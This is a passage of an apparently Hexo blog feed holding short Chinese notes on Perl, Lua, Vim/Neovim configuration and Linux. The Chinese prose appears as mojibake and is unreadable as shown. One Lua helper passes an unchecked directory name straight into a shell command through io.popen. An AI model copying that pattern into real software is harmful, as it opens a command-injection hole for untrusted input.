open $cgi_data_file: $!&quot;</span>;<br>    CGI-&gt;new($fh);<br></code></pre></td></tr></table></figure><h3 id="ç»™åŒ¿åå­ç¨‹åºå‘½å"><a href="#ç»™åŒ¿åå­ç¨‹åºå‘½å" class="headerlink" title="ç»™åŒ¿åå­ç¨‹åºå‘½å"></a>ç»™åŒ¿åå­ç¨‹åºå‘½å</h3><p>ä½¿ç”¨ <code>typeglob</code> èµ‹å€¼, å¯ä»¥ç»™åŒ¿åå­ç¨‹åºèµ‹äºˆä¸€ä¸ªåå­—. è¿™æ ·å°±å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå·²å‘½åçš„å­ç¨‹åº, è€Œä¸å¿…ä½¿ç”¨è§£å¼•ç”¨æ¥å¾—åˆ°å­ç¨‹åº.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">*func = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; ... &#125;;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨åˆ™å¯ä»¥å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&amp;func;<br></code></pre></td></tr></table></figure><p>å› ä¸ºåªæ˜¯å¯¹å¼•ç”¨èµ‹å€¼, å®ƒå½±å“çš„åªæ˜¯ <code>typeglob</code> ä¸­çš„å­ç¨‹åºéƒ¨åˆ†.</p><h3 id="ç®€å•çš„æ–¹æ³•"><a href="#ç®€å•çš„æ–¹æ³•" class="headerlink" title="ç®€å•çš„æ–¹æ³•"></a>ç®€å•çš„æ–¹æ³•</h3><p>ä½¿ç”¨ <code>Package::Stash</code> æ¨¡å—, å¯ä»¥ç®€åŒ–å¯¹ <code>typeglob</code> å’Œ stash çš„æ“ä½œ.</p><p>è¦ä¿®æ”¹ä¸€ä¸ª stash, åªéœ€è¦åˆ›å»ºä¸€ä¸ªå¯¹è±¡, æä¾›ä¾›è¯¥ stash ä½¿ç”¨çš„å‘½åç©ºé—´ (ä¸åŠ å†’å·), å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Package::Stash;<br><br><span class="hljs-keyword">my</span> $foo_stash = Package::Stash-&gt;new( <span class="hljs-string">&#x27;Animals&#x27;</span> );<br></code></pre></td></tr></table></figure><p>æ·»åŠ ä¸€ä¸ªå˜é‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$foo_stash-&gt;add_symbol( <span class="hljs-string">&#x27;$camel&#x27;</span> );<br><span class="hljs-comment"># å¹¶èµ‹å€¼</span><br>$foo_stash-&gt;add_symbol( <span class="hljs-string">&#x27;$camel&#x27;</span>, <span class="hljs-string">&#x27;Amelia&#x27;</span> );<br></code></pre></td></tr></table></figure><p>æ˜¾ç¤ºæŸä¸ªç‰¹å®š stash ä¸­çš„æ‰€æœ‰åç§°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! /usr/bin/perl</span><br><span class="hljs-comment"># </span><br><span class="hljs-keyword">use</span> Package::Stash;<br><br><span class="hljs-keyword">my</span> $main_stash = Package::Stash-&gt;new( <span class="hljs-string">&#x27;main&#x27;</span> )-&gt;get_all_symbols;<br><br><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $key ( <span class="hljs-keyword">keys</span> %$main_stash ) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$key\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Effective-Perl-Notes</title>
    <link href="/2023/01/08/Effective-Perl-Notes/"/>
    <url>/2023/01/08/Effective-Perl-Notes/</url>
    
    <content type="html"><![CDATA[<p>å¯éµå¾ª perlstyle æ–‡æ¡£çš„é£æ ¼.</p><p>æœ¬ä¹¦ç›¸å…³çš„ç½‘ç«™ ( <a href="http://effectiveperl-programming.com/">http://effectiveperl-programming.com/</a> )</p><p>Perl é«˜å°”å¤«, æ˜¯ä¸€ç§ä¸å®šæ—¶ä¸¾è¡Œçš„ Perl ç¨‹åºè®¾è®¡æ¸¸æˆ, ä»¥ç¨‹åºç¼–ç æœ€çŸ­è€…è·èƒœ, å°±åƒé«˜å°”å¤«çƒä¸­æœ€å°‘æ†è€…è·èƒœä¸€æ ·, å…·ä½“å‚è€ƒ <a href="http://perlgolf.sourceforget.net/">http://perlgolf.sourceforget.net/</a></p><h1 id="ç¬¬ä¸€ç« -Perl-åŸºç¡€"><a href="#ç¬¬ä¸€ç« -Perl-åŸºç¡€" class="headerlink" title="ç¬¬ä¸€ç«  Perl åŸºç¡€"></a>ç¬¬ä¸€ç«  Perl åŸºç¡€</h1>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Perl-Critic-æ¨¡å—</title>
    <link href="/2023/01/07/%E5%85%B3%E4%BA%8E-Perl-Critic-%E6%A8%A1%E5%9D%97/"/>
    <url>/2023/01/07/%E5%85%B3%E4%BA%8E-Perl-Critic-%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>éƒ¨åˆ†-Linux-å‘½ä»¤</title>
    <link href="/2023/01/07/%E9%83%A8%E5%88%86-Linux-%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/01/07/%E9%83%A8%E5%88%86-Linux-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="iwconfig"><a href="#iwconfig" class="headerlink" title="iwconfig"></a>iwconfig</h1><p>å¯æŸ¥çœ‹ wifi ä¿¡æ¯.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯å¥æŸ„</title>
    <link href="/2023/01/06/%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%A5%E6%9F%84/"/>
    <url>/2023/01/06/%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%A5%E6%9F%84/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/27656256/answer/943130123?utm_medium=social&utm_oi=1215946114580484096&utm_psn=1594637255934676993&utm_source=qq">å‚è€ƒç½‘é¡µ</a></p><p>ç†è§£:<br>door handle æ˜¯æŒ‡é—¨æŠŠæ‰‹ï¼Œé€šè¿‡é—¨æŠŠæ‰‹å¯ä»¥å»æ§åˆ¶é—¨.</p><p>file handle å¯ä»¥ç”¨æ¥æ“æ§ file.</p><p>å¥æŸ„æ˜¯ä¸€ä¸ªæ•´æ•°, ç”¨æ¥å”¯ä¸€æ ‡è¯†ä¸€ä¸ªèµ„æº.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç”¨-Perl-ç¼–å†™ç®¡ç†-dotfile-çš„ç¨‹åº</title>
    <link href="/2023/01/05/%E7%94%A8-Perl-%E7%BC%96%E5%86%99%E7%AE%A1%E7%90%86-dotfile-%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
    <url>/2023/01/05/%E7%94%A8-Perl-%E7%BC%96%E5%86%99%E7%AE%A1%E7%90%86-dotfile-%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>perl-è¾“å‡ºæ—¶-Wide-charactor-in-print-æŠ¥é”™</title>
    <link href="/2023/01/04/perl-%E8%BE%93%E5%87%BA%E6%97%B6-Wide-charactor-in-print-%E6%8A%A5%E9%94%99/"/>
    <url>/2023/01/04/perl-%E8%BE%93%E5%87%BA%E6%97%B6-Wide-charactor-in-print-%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.ostermiller.org/perl-wide-character-in-print/">å‚è€ƒç½‘é¡µ</a></p><p>æœ‰å‡ ç§æ–¹æ³•.</p><h1 id="è®¾ç½®è¾“å‡ºæµçš„æ¨¡å¼"><a href="#è®¾ç½®è¾“å‡ºæµçš„æ¨¡å¼" class="headerlink" title="è®¾ç½®è¾“å‡ºæµçš„æ¨¡å¼"></a>è®¾ç½®è¾“å‡ºæµçš„æ¨¡å¼</h1><p>å¯ä»¥åœ¨ <code>print</code> ä¹‹å‰æ·»åŠ :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">binmode</span>(STDOUT, <span class="hljs-string">&quot;:utf8&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ‰“å¼€æ–‡ä»¶å¥æŸ„æ—¶è®¾ç½®:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl</span><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">open</span> <span class="hljs-string">&quot;:std&quot;</span>, <span class="hljs-string">&quot;:encoding(UTF-8)&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\x&#123;194&#125;\n&quot;</span>;<br><span class="hljs-keyword">open</span> (FH, <span class="hljs-string">&quot;&gt;:encoding(UTF-8)&quot;</span>, <span class="hljs-string">&quot;gamma.txt&quot;</span>);<br><span class="hljs-keyword">print</span> FH <span class="hljs-string">&quot;\x&#123;194&#125;\n&quot;</span>;<br><span class="hljs-keyword">close</span>(FH);<br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨-utf8-all-æ¨¡å—"><a href="#ä½¿ç”¨-utf8-all-æ¨¡å—" class="headerlink" title="ä½¿ç”¨ utf8::all æ¨¡å—"></a>ä½¿ç”¨ utf8::all æ¨¡å—</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl</span><br><span class="hljs-keyword">use</span> utf8::all;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\x&#123;194&#125;\n&quot;</span>;<br><span class="hljs-keyword">open</span> (FH, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;gamma.txt&quot;</span>);<br><span class="hljs-keyword">print</span> FH <span class="hljs-string">&quot;\x&#123;194&#125;\n&quot;</span>;<br><span class="hljs-keyword">close</span>(FH);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨-Vim-ä¸­è¾“å…¥-Unicode-çš„æ–¹æ³•</title>
    <link href="/2023/01/04/%E5%9C%A8-Vim-%E4%B8%AD%E8%BE%93%E5%85%A5-Unicode-%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <url>/2023/01/04/%E5%9C%A8-Vim-%E4%B8%AD%E8%BE%93%E5%85%A5-Unicode-%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p><a href="https://x-team.com/blog/inserting-unicode-characters-in-vim/">å‚è€ƒç½‘é¡µ</a></p><h1 id="ä¸ä½¿ç”¨æ’ä»¶"><a href="#ä¸ä½¿ç”¨æ’ä»¶" class="headerlink" title="ä¸ä½¿ç”¨æ’ä»¶"></a>ä¸ä½¿ç”¨æ’ä»¶</h1><p>åœ¨ insert æ¨¡å¼ä¸‹æŒ‰ <code>Ctrl+v</code> , ç„¶åå…ˆè¾“å…¥ <code>U</code>, å†è¾“å…¥ unicode å°±èƒ½æ˜¾ç¤ºå‡ºæ¥.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lua-æŠ€å·§ç§¯ç´¯</title>
    <link href="/2023/01/04/Lua-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2023/01/04/Lua-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="è·å–ä¸€ä¸ªç›®å½•ä¸‹çš„å…¨éƒ¨æ–‡ä»¶"><a href="#è·å–ä¸€ä¸ªç›®å½•ä¸‹çš„å…¨éƒ¨æ–‡ä»¶" class="headerlink" title="è·å–ä¸€ä¸ªç›®å½•ä¸‹çš„å…¨éƒ¨æ–‡ä»¶"></a>è·å–ä¸€ä¸ªç›®å½•ä¸‹çš„å…¨éƒ¨æ–‡ä»¶</h1><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">-- Lua implementation of PHP scandir function</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">scandir</span><span class="hljs-params">(directory)</span></span><br>    <span class="hljs-keyword">local</span> i, t, <span class="hljs-built_in">popen</span> = <span class="hljs-number">0</span>, &#123;&#125;, <span class="hljs-built_in">io</span>.<span class="hljs-built_in">popen</span><br>    <span class="hljs-keyword">local</span> pfile = <span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;ls -a &quot;&#x27;</span>..directory..<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> pfile:<span class="hljs-built_in">lines</span>() <span class="hljs-keyword">do</span><br>        i = i + <span class="hljs-number">1</span><br>        t[i] = filename<br>    <span class="hljs-keyword">end</span><br>    pfile:<span class="hljs-built_in">close</span>()<br>    <span class="hljs-keyword">return</span> t<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><code>io.popen</code> è¿”å›ä¸€ä¸ªè¿›ç¨‹çš„æ–‡ä»¶å¥æŸ„, è¿™ä¸ªè¿›ç¨‹ä¼¼ä¹å¯ä»¥å¯ä»¥è¿è¡Œ shell å‘½ä»¤.</p><p>æ–‡ä»¶å¥æŸ„è¿™ä¸€ç±»å¯¹è±¡éƒ½æœ‰ <code>lines()</code>, <code>close()</code> è¿™äº›æ–¹æ³•.</p><h1 id="å‘½ä»¤è¡Œå‚æ•°"><a href="#å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="å‘½ä»¤è¡Œå‚æ•°"></a>å‘½ä»¤è¡Œå‚æ•°</h1><p>Lua æŠŠå‘½ä»¤è¡Œå‚æ•°å­˜å‚¨åœ¨ <code>arg</code> è¡¨ä¸­.</p><h1 id="è·å–-vimscript-å˜é‡"><a href="#è·å–-vimscript-å˜é‡" class="headerlink" title="è·å– vimscript å˜é‡"></a>è·å– vimscript å˜é‡</h1><p>å¦‚è·å– vimscript å†…ç½®å˜é‡:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">var = vim.api.nvim_get_vvar(<span class="hljs-string">&quot;argv&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="è·å–åˆ—è¡¨é•¿åº¦"><a href="#è·å–åˆ—è¡¨é•¿åº¦" class="headerlink" title="è·å–åˆ—è¡¨é•¿åº¦"></a>è·å–åˆ—è¡¨é•¿åº¦</h1><p>ä½¿ç”¨ <code>#</code></p><h1 id="å¤šçº¿ç¨‹è¿è¡Œç¨‹åº"><a href="#å¤šçº¿ç¨‹è¿è¡Œç¨‹åº" class="headerlink" title="å¤šçº¿ç¨‹è¿è¡Œç¨‹åº"></a>å¤šçº¿ç¨‹è¿è¡Œç¨‹åº</h1>]]></content>
    
    
    <categories>
      
      <category>Lua</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LuaSnip-ä½¿ç”¨</title>
    <link href="/2023/01/03/LuaSnip-%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/01/03/LuaSnip-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ä½¿ç”¨-json-æ ¼å¼ç¼–å†™"><a href="#ä½¿ç”¨-json-æ ¼å¼ç¼–å†™" class="headerlink" title="ä½¿ç”¨ json æ ¼å¼ç¼–å†™"></a>ä½¿ç”¨ <code>json</code> æ ¼å¼ç¼–å†™</h1><p>å®šä¹‰ä»£ç æ®µæ—¶å†™åœ¨ <code>json</code> æ–‡ä»¶ä¸­, </p><p>å®šä¹‰å¦‚:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;require&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;req&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;body&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-string">&quot;require(\&quot;$&#123;1:module&#125;\&quot;)&quot;</span><br>        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Require module&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>prefix</code> å°±æ˜¯ç”¨æ¥è§¦å‘ snip çš„è¯. </p><p><code>body</code> å°±æ˜¯å®šä¹‰ snip å†…å®¹.</p><p><code>description</code> æ˜¯è¿™ä¸ª snip çš„æè¿°.</p><h1 id="ä½¿ç”¨1-lua-æ ¼å¼ç¼–å†™"><a href="#ä½¿ç”¨1-lua-æ ¼å¼ç¼–å†™" class="headerlink" title="ä½¿ç”¨1 lua æ ¼å¼ç¼–å†™"></a>ä½¿ç”¨1 <code>lua</code> æ ¼å¼ç¼–å†™</h1>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>KVM-è™šæ‹Ÿæœºæ˜¾å¡ç›´é€š</title>
    <link href="/2023/01/01/KVM-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/"/>
    <url>/2023/01/01/KVM-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>KVM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Gentoo-å®‰è£…</title>
    <link href="/2023/01/01/Gentoo-%E5%AE%89%E8%A3%85/"/>
    <url>/2023/01/01/Gentoo-%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p><code>stage3</code> çš„åŒ…æ˜¯ä»€ä¹ˆæ„æ€.</p><p>å…ˆéšä¾¿ç”¨ä¸€ä¸ªå®‰è£…ä»‹è´¨è¿›å…¥ Linux å®‰è£…ç•Œé¢, ç„¶åä¸‹è½½ Gentoo çš„ stage åŒ…, å†å®‰è£….</p><p>å°† <code>stage</code> åŒ…è§£å‹å‡ºæ¥å°±æ˜¯åŸºæœ¬çš„ Linux æ ¹ç›®å½•çš„æ ·å­.</p><p>ç”¨ <code>eselect</code> é€‰æ‹©è¯­è¨€.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç”¨-lua-ç¼–å†™-vim-æ’ä»¶</title>
    <link href="/2022/12/31/%E7%94%A8-lua-%E7%BC%96%E5%86%99-vim-%E6%8F%92%E4%BB%B6/"/>
    <url>/2022/12/31/%E7%94%A8-lua-%E7%BC%96%E5%86%99-vim-%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Neovim-from-scratch-Notes</title>
    <link href="/2022/12/30/Neovim-from-scratch-Notes/"/>
    <url>/2022/12/30/Neovim-from-scratch-Notes/</url>
    
    <content type="html"><![CDATA[<p>neovim ä¸­ä½¿ç”¨ <code>require</code> åŠ è½½æ–‡ä»¶æ—¶, é»˜è®¤ä¼šåœ¨é…ç½®æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹çš„ <code>lua</code> ç›®å½•ä¸‹æ‰¾. é…ç½®æ–‡ä»¶æ‰€åœ¨ç›®å½•ç”±ç¯å¢ƒå˜é‡ <code>VIMCONFIG</code> æ¥æŒ‡å®š, å³é»˜è®¤æŸ¥æ‰¾ <code>$VIMCONFIG/lua</code>, å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">require</span> <span class="hljs-string">&quot;test&quot;</span><br></code></pre></td></tr></table></figure><p>åˆ™ä¼šåŠ è½½ <code>$VIMCONFIG/lua/test.lua</code> æ–‡ä»¶.</p><p>æ–‡ä»¶çš„å±‚æ¬¡å¯ä»¥é€šè¿‡ <code>.</code> åŒºåˆ†, å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">require</span> <span class="hljs-string">&quot;test.haha&quot;</span><br></code></pre></td></tr></table></figure><p>åˆ™ä¼šåŠ è½½ <code>$VIMCONFIG/lua/test/haha.lua</code> æ–‡ä»¶.</p><p><code>require</code> æŸ¥æ‰¾çš„è·¯å¾„å®é™…ä¸Šä¸ºå˜é‡ <code>package.path</code> çš„å€¼.</p><h1 id="P2-åŸºç¡€é€‰é¡¹é…ç½®-Setting-options"><a href="#P2-åŸºç¡€é€‰é¡¹é…ç½®-Setting-options" class="headerlink" title="P2 åŸºç¡€é€‰é¡¹é…ç½®-Setting options"></a>P2 åŸºç¡€é€‰é¡¹é…ç½®-Setting options</h1><p>ç»„ç»‡ <code>lua</code> ç›®å½•ä¸‹çš„æ–‡ä»¶æ—¶å¯ä»¥åˆ›å»ºå­ç›®å½•.</p><p><mark>æ³¨æ„</mark>, å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">vim.opt.backup<br></code></pre></td></tr></table></figure><p>ä¸:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">vim.opt[<span class="hljs-string">&#x27;backup&#x27;</span>]<br></code></pre></td></tr></table></figure><p>ç­‰ä»·.</p><p><mark>è®¾ç½® vim çš„é€‰é¡¹ (option) ç”¨</mark>:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">vim.opt<br></code></pre></td></tr></table></figure><p>å¼€å¤´.</p><p>å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">vim.opt.backup = <span class="hljs-literal">false</span><br>vim.opt.cmdheight = <span class="hljs-number">2</span><br>vim.opt[<span class="hljs-string">&#x27;hlsearch&#x27;</span>] = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><mark>è¿è¡Œ vim çš„å‘½ä»¤ç”¨</mark>:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">vim.cmd<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">vim.cmd <span class="hljs-string">&quot;set whichwrap+=&lt;,&gt;,[,],h,l&quot;</span><br>vim.cmd <span class="hljs-string">[[set iskeyword+=-]]</span><br></code></pre></td></tr></table></figure><h1 id="P3-å®šåˆ¶ä½ çš„é”®ç›˜æ˜ å°„-Custom-Keymaps"><a href="#P3-å®šåˆ¶ä½ çš„é”®ç›˜æ˜ å°„-Custom-Keymaps" class="headerlink" title="P3 å®šåˆ¶ä½ çš„é”®ç›˜æ˜ å°„-Custom Keymaps"></a>P3 å®šåˆ¶ä½ çš„é”®ç›˜æ˜ å°„-Custom Keymaps</h1><p>é”®ç›˜æ˜ å°„ä½¿ç”¨ <code>vim.api.nvim_set_keymap</code> å‡½æ•°, å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">-- ç”¨æ›´çŸ­çš„å‡½æ•°åˆ«å</span><br><span class="hljs-keyword">local</span> keymap = vim.api.nvim_set_keymap<br>keymap(<span class="hljs-string">&quot;æ¨¡å¼&quot;</span>, <span class="hljs-string">&quot;è®¾ç½®çš„é”®ä½&quot;</span>, <span class="hljs-string">&quot;æ›¿æ¢çš„é”®ä½&quot;</span>, <span class="hljs-string">&quot;å…¶ä»–é€‰é¡¹&quot;</span>)<br><span class="hljs-comment">-- ä¾‹å¦‚</span><br><span class="hljs-keyword">local</span> opts = &#123; noremap = <span class="hljs-literal">true</span>, silent = <span class="hljs-literal">true</span> &#125;<br>keymap(<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;jk&quot;</span>, <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, opts)<br></code></pre></td></tr></table></figure><p>ä¸Šé¢å°±æ˜¯æŠŠ <code>jk</code> æ˜ å°„ä¸º <code>&lt;ESC&gt;</code> çš„å†™æ³•.</p><p>æ¨¡å¼åŒ…æ‹¬:</p><ul><li><code>n</code>, normal</li><li><code>i</code>, insert</li><li><code>v</code>, visual</li><li><code>x</code>, visual block</li><li><code>t</code>, term</li><li><code>c</code>, command</li></ul><p>è®¾ç½® <code>leader</code>:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">vim.g.mapleader = <span class="hljs-string">&quot; &quot;</span><br>vim.g.maplocalleader = <span class="hljs-string">&quot; &quot;</span><br></code></pre></td></tr></table></figure><h1 id="P4-äº†è§£vimæ’ä»¶ä½“ç³»-Plugin-Deep-Dive"><a href="#P4-äº†è§£vimæ’ä»¶ä½“ç³»-Plugin-Deep-Dive" class="headerlink" title="P4 äº†è§£vimæ’ä»¶ä½“ç³» - Plugin Deep Dive"></a>P4 äº†è§£vimæ’ä»¶ä½“ç³» - Plugin Deep Dive</h1><p><code>packer.nvim</code> æ’ä»¶ä½¿ç”¨, åœ¨ç”¨ nvim æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ˜¯, å…¶å°±ä¼šå¼€å§‹ä¸‹è½½æ’ä»¶.</p><p><code>site/pack/packer</code> ç›®å½•ä¸‹çš„ä¸¤ä¸ªç›®å½•:</p><ul><li><code>opt</code> ä»£è¡¨ optional </li><li><code>start</code> ä»£è¡¨ä¸€æ‰“å¼€ nvim å°±è¿è¡Œ</li></ul><p><code>plugins/packer_compiled.lua</code> æ–‡ä»¶å¯èƒ½ä¼šåŠ å¿«æ’ä»¶çš„æ‰“åŒ…é€Ÿåº¦.</p><p>æ’ä»¶é»˜è®¤æ”¾åœ¨ <code>start</code> ç›®å½•ä¸‹, è‹¥è¦æ”¾åœ¨ <code>opt</code> ç›®å½•ä¸‹, éœ€æ·»åŠ  <code>opt = true</code>, å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">use &#123; <span class="hljs-string">&#x27;vim/plugins&#x27;</span>, opt = <span class="hljs-literal">true</span> &#125;<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å…¶ä»–å¯é€‰å…³é”®å­—, å¦‚ <code>run</code> ç”¨æ¥è¿è¡Œå‘½ä»¤, <code>branch</code> ç”¨æ¥æŒ‡å®šåˆ†æ”¯ç­‰.</p><p>æœ‰äº›æ’ä»¶é™¤äº†ç”¨ <code>packer</code> å®‰è£…ä»¥å¤–, è¿˜éœ€è¦ <code>require().setup&#123;&#125;</code>.</p><h1 